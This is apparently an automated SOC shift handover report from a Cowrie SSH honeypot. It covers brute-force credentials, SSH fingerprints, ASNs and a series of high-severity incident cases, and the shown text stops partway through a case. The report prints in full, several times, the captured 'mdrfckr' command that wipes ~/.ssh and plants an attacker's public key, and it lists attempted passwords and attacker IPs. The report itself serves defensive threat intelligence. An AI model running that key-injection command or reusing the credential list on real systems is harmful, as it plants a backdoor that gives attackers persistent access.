# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-01 |
| **Generated At** | 2026-05-01T06:40:36Z |
| **Shift Time** | 06:40 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **3548** |
| Confirmed Threats | **196** |
| False Positives Filtered | **3352** (94.5%) |
| Unique Attacker IPs | **49** |
| Countries of Origin | **24** |
| High Severity Cases | **56** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **3492** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **196** |
| Unique Credential Pairs | **93** |
| Unique Usernames | **32** |
| Unique Passwords | **86** |
| Successful Auth Pairs | **33** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 56 |
| `345gs5662d34` | 28 |
| `ubuntu` | 17 |
| `test` | 12 |
| `postgres` | 12 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 28 |
| `3245gs5662d34` | 28 |
| `123` | 8 |
| `1234` | 7 |
| `555555` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 28 |
| `root` | `3245gs5662d34` | 28 |
| `test` | `test54321` | 3 |
| `user` | `debian` | 3 |
| `admin` | `qwert` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `teste123` | `103.101.197.221` | 2026-05-01T04:11:48 |
| `root` | `3245gs5662d34` | `103.101.197.221` | 2026-05-01T04:11:50 |
| `root` | `hduser123456789` | `103.101.197.221` | 2026-05-01T04:18:42 |
| `root` | `mediaserviceadmin` | `103.101.197.221` | 2026-05-01T04:24:14 |
| `root` | `Wb@123456789` | `143.255.141.221` | 2026-05-01T05:37:25 |
| `root` | `3245gs5662d34` | `143.255.141.221` | 2026-05-01T05:37:32 |
| `root` | `AA123456.` | `143.255.141.221` | 2026-05-01T05:39:48 |
| `root` | `123QWEqwe!` | `143.255.141.221` | 2026-05-01T05:43:01 |
| `root` | `netapp123` | `143.255.141.221` | 2026-05-01T05:44:01 |
| `root` | `aK123456` | `143.255.141.221` | 2026-05-01T05:45:02 |
| `root` | `bobby` | `143.255.141.221` | 2026-05-01T05:46:08 |
| `root` | `Cx@123456` | `143.255.141.221` | 2026-05-01T05:47:09 |
| `root` | `1122334a` | `143.255.141.221` | 2026-05-01T05:48:11 |
| `root` | `Dm123456` | `143.255.141.221` | 2026-05-01T05:49:14 |
| `root` | `root12` | `143.255.141.221` | 2026-05-01T05:50:17 |
| `root` | `shakeel` | `143.255.141.221` | 2026-05-01T05:51:21 |
| `root` | `123QWEasdzxc` | `143.255.141.221` | 2026-05-01T05:52:23 |
| `root` | `odoo@123` | `143.255.141.221` | 2026-05-01T05:53:26 |
| `root` | `Asd@1234` | `143.255.141.221` | 2026-05-01T05:54:29 |
| `root` | `123456ad` | `143.255.141.221` | 2026-05-01T05:55:35 |
| `root` | `Zz123456@` | `143.255.141.221` | 2026-05-01T05:56:39 |
| `root` | `1qazxcvbnm,.` | `143.255.141.221` | 2026-05-01T05:57:41 |
| `root` | `Q2w3e4r5t6y7u8i9o0` | `143.255.141.221` | 2026-05-01T05:58:46 |
| `root` | `Aa12345!@#` | `143.255.141.221` | 2026-05-01T06:00:50 |
| `root` | `Test2026` | `143.255.141.221` | 2026-05-01T06:02:58 |
| `root` | `Bj123456` | `143.255.141.221` | 2026-05-01T06:04:01 |
| `root` | `admin00` | `185.16.214.226` | 2026-05-01T06:04:34 |
| `root` | `3245gs5662d34` | `185.16.214.226` | 2026-05-01T06:04:39 |
| `root` | `aspect` | `143.255.141.221` | 2026-05-01T06:06:12 |
| `root` | `admin00` | `102.216.240.71` | 2026-05-01T06:12:46 |
| `root` | `3245gs5662d34` | `102.216.240.71` | 2026-05-01T06:12:54 |
| `root` | `admin00` | `209.99.190.113` | 2026-05-01T06:27:49 |
| `root` | `3245gs5662d34` | `209.99.190.113` | 2026-05-01T06:27:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **3548** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 203 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 147 | 4 |
| `03a80b21afa8...` | Modern SSH client | 53 | 2 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 147 | 4 | libssh-based |
| `03a80b21afa8...` | libssh | 53 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 28 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `209.99.190.113`, `185.16.214.226`, `102.216.240.71`, `103.101.197.221`, `143.255.141.221`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **49** |
| Unique ASNs | **41** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS16276` | OVH SAS | 4 | LOW |
| `AS51167` | Contabo GmbH | 3 | MEDIUM |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS24940` | Hetzner Online GmbH | 2 | MEDIUM |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS268537` | TN FIBRA | 1 | LOW |
| `AS174` | Cogent Communications, LLC | 1 | HIGH |
| `AS63526` | Systems Solutions & development Technologies Limited | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (50)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b5cafd69a4d7

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:37 |
| **Last Seen** | 2026-05-01 05:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:37:23` | `cowrie.session.connect` |
| `2026-05-01 05:37:23` | `cowrie.client.version` |
| `2026-05-01 05:37:23` | `cowrie.client.kex` |
| `2026-05-01 05:37:25` | `cowrie.login.success` |
| `2026-05-01 05:37:25` | `cowrie.session.params` |
| `2026-05-01 05:37:25` | `cowrie.command.input` |
| `2026-05-01 05:37:25` | `cowrie.command.failed` |
| `2026-05-01 05:37:26` | `cowrie.log.closed` |
| `2026-05-01 05:37:26` | `cowrie.session.params` |
| `2026-05-01 05:37:26` | `cowrie.command.input` |
| `2026-05-01 05:37:27` | `cowrie.session.file_download` |
| `2026-05-01 05:37:27` | `cowrie.log.closed` |
| `2026-05-01 05:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b9637997324

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:37 |
| **Last Seen** | 2026-05-01 05:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:37:31` | `cowrie.session.connect` |
| `2026-05-01 05:37:31` | `cowrie.client.version` |
| `2026-05-01 05:37:31` | `cowrie.client.kex` |
| `2026-05-01 05:37:32` | `cowrie.login.success` |
| `2026-05-01 05:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef242b985740

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:39 |
| **Last Seen** | 2026-05-01 05:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:39:46` | `cowrie.session.connect` |
| `2026-05-01 05:39:46` | `cowrie.client.version` |
| `2026-05-01 05:39:46` | `cowrie.client.kex` |
| `2026-05-01 05:39:48` | `cowrie.login.success` |
| `2026-05-01 05:39:49` | `cowrie.session.params` |
| `2026-05-01 05:39:49` | `cowrie.command.input` |
| `2026-05-01 05:39:49` | `cowrie.command.failed` |
| `2026-05-01 05:39:49` | `cowrie.log.closed` |
| `2026-05-01 05:39:50` | `cowrie.session.params` |
| `2026-05-01 05:39:50` | `cowrie.command.input` |
| `2026-05-01 05:39:50` | `cowrie.session.file_download` |
| `2026-05-01 05:39:50` | `cowrie.log.closed` |
| `2026-05-01 05:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bce4ab9d7fc

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:39 |
| **Last Seen** | 2026-05-01 05:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:39:54` | `cowrie.session.connect` |
| `2026-05-01 05:39:54` | `cowrie.client.version` |
| `2026-05-01 05:39:54` | `cowrie.client.kex` |
| `2026-05-01 05:39:56` | `cowrie.login.success` |
| `2026-05-01 05:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48014291ee40

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:43 |
| **Last Seen** | 2026-05-01 05:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:43:00` | `cowrie.session.connect` |
| `2026-05-01 05:43:00` | `cowrie.client.version` |
| `2026-05-01 05:43:00` | `cowrie.client.kex` |
| `2026-05-01 05:43:01` | `cowrie.login.success` |
| `2026-05-01 05:43:02` | `cowrie.session.params` |
| `2026-05-01 05:43:02` | `cowrie.command.input` |
| `2026-05-01 05:43:02` | `cowrie.command.failed` |
| `2026-05-01 05:43:02` | `cowrie.log.closed` |
| `2026-05-01 05:43:03` | `cowrie.session.params` |
| `2026-05-01 05:43:03` | `cowrie.command.input` |
| `2026-05-01 05:43:03` | `cowrie.session.file_download` |
| `2026-05-01 05:43:03` | `cowrie.log.closed` |
| `2026-05-01 05:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-545c9bed5e88

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:43 |
| **Last Seen** | 2026-05-01 05:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:43:07` | `cowrie.session.connect` |
| `2026-05-01 05:43:07` | `cowrie.client.version` |
| `2026-05-01 05:43:08` | `cowrie.client.kex` |
| `2026-05-01 05:43:09` | `cowrie.login.success` |
| `2026-05-01 05:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b437c01c9c56

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:44 |
| **Last Seen** | 2026-05-01 05:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:44:00` | `cowrie.session.connect` |
| `2026-05-01 05:44:00` | `cowrie.client.version` |
| `2026-05-01 05:44:00` | `cowrie.client.kex` |
| `2026-05-01 05:44:01` | `cowrie.login.success` |
| `2026-05-01 05:44:02` | `cowrie.session.params` |
| `2026-05-01 05:44:02` | `cowrie.command.input` |
| `2026-05-01 05:44:02` | `cowrie.command.failed` |
| `2026-05-01 05:44:02` | `cowrie.log.closed` |
| `2026-05-01 05:44:03` | `cowrie.session.params` |
| `2026-05-01 05:44:03` | `cowrie.command.input` |
| `2026-05-01 05:44:03` | `cowrie.session.file_download` |
| `2026-05-01 05:44:03` | `cowrie.log.closed` |
| `2026-05-01 05:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9de793526e18

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:44 |
| **Last Seen** | 2026-05-01 05:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:44:07` | `cowrie.session.connect` |
| `2026-05-01 05:44:07` | `cowrie.client.version` |
| `2026-05-01 05:44:08` | `cowrie.client.kex` |
| `2026-05-01 05:44:09` | `cowrie.login.success` |
| `2026-05-01 05:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45ecca39801

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:45 |
| **Last Seen** | 2026-05-01 05:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:45:00` | `cowrie.session.connect` |
| `2026-05-01 05:45:00` | `cowrie.client.version` |
| `2026-05-01 05:45:01` | `cowrie.client.kex` |
| `2026-05-01 05:45:02` | `cowrie.login.success` |
| `2026-05-01 05:45:03` | `cowrie.session.params` |
| `2026-05-01 05:45:03` | `cowrie.command.input` |
| `2026-05-01 05:45:03` | `cowrie.command.failed` |
| `2026-05-01 05:45:03` | `cowrie.log.closed` |
| `2026-05-01 05:45:04` | `cowrie.session.params` |
| `2026-05-01 05:45:04` | `cowrie.command.input` |
| `2026-05-01 05:45:04` | `cowrie.session.file_download` |
| `2026-05-01 05:45:04` | `cowrie.log.closed` |
| `2026-05-01 05:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12e9c97b391e

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:45 |
| **Last Seen** | 2026-05-01 05:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:45:08` | `cowrie.session.connect` |
| `2026-05-01 05:45:08` | `cowrie.client.version` |
| `2026-05-01 05:45:08` | `cowrie.client.kex` |
| `2026-05-01 05:45:10` | `cowrie.login.success` |
| `2026-05-01 05:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d118646a5e4

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:46 |
| **Last Seen** | 2026-05-01 05:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:46:06` | `cowrie.session.connect` |
| `2026-05-01 05:46:06` | `cowrie.client.version` |
| `2026-05-01 05:46:06` | `cowrie.client.kex` |
| `2026-05-01 05:46:08` | `cowrie.login.success` |
| `2026-05-01 05:46:08` | `cowrie.session.params` |
| `2026-05-01 05:46:08` | `cowrie.command.input` |
| `2026-05-01 05:46:08` | `cowrie.command.failed` |
| `2026-05-01 05:46:09` | `cowrie.log.closed` |
| `2026-05-01 05:46:10` | `cowrie.session.params` |
| `2026-05-01 05:46:10` | `cowrie.command.input` |
| `2026-05-01 05:46:10` | `cowrie.session.file_download` |
| `2026-05-01 05:46:10` | `cowrie.log.closed` |
| `2026-05-01 05:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38550f33ea75

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:46 |
| **Last Seen** | 2026-05-01 05:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-01 05:46:14` | `cowrie.session.connect` |
| `2026-05-01 05:46:14` | `cowrie.client.version` |
| `2026-05-01 05:46:14` | `cowrie.client.kex` |
| `2026-05-01 05:46:15` | `cowrie.login.success` |
| `2026-05-01 05:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.255.141[.]221` to AbuseIPDB if not already reported
- [ ] Block `143.255.141[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f049e7c48655

| Field | Detail |
|---|---|
| **Source IP** | `143.255.141[.]221` |
| **First Seen** | 2026-05-01 05:47 |
| **Last Seen** | 2026-05-01 05:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
